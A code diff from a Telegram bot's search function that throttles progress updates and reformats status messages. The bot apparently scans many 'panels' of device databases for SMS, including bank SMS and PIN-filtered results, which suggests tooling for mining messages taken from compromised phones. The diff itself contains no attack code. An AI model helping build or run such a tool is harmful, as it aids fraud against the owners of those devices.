@@ -149,15 +149,16 @@ async function executeSearch(ctx, opts) {
   });
 
   const abort = () => SEARCH_ABORT.get(uid) !== 'running';
+  let lastProgEdit = 0;
   try {
     const out = await runSearch(globalPanels, opts, prog => {
       if (abort()) return;
-      let msg = '⚡ Search...';
-      if (prog.phase === 'panels') {
-        msg = `📥 DBs ${prog.done}/${prog.total} · ${prog.count} devices`;
-      } else if (prog.phase === 'sms') {
-        msg = `📌 SMS ${prog.done}/${prog.total} · matched ${prog.matched}`;
-      }
+      const now = Date.now();
+      const isLast =
+        prog.panelsDone >= prog.panelsTotal && prog.panelsTotal > 0;
+      if (!isLast && now - lastProgEdit < 2500) return;
+      lastProgEdit = now;
+      const msg = `📥 DBs ${prog.panelsDone}/${prog.panelsTotal}\n📌 SMS scanned: ${prog.devices} · match: ${prog.matched}`;
       ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, msg).catch(() => {});
     });
 
@@ -180,7 +181,7 @@ async function executeSearch(ctx, opts) {
       undefined,
       `✅ Done! ${kw} | ${onlineLbl} | ${pinLbl} | ${sortLbl} | ${dayLbl}\n` +
         `📊 SMS: ${out.stats.sms} · TXT devices: ${out.stats.devices}\n` +
-        `🔎 Scanned: ${out.stats.scanned} · bank SMS: ${out.stats.withBankSms} · tier match: ${out.stats.devices}\n` +
+        `🔎 DBs: ${out.stats.panelsDone}/${out.stats.panelsTotal} · SMS devices: ${out.stats.scanned} · TXT: ${out.stats.devices}\n` +
         `⏱ ${(out.elapsed / 1000).toFixed(0)}s · 📄 File upar ☝️`
     );
 
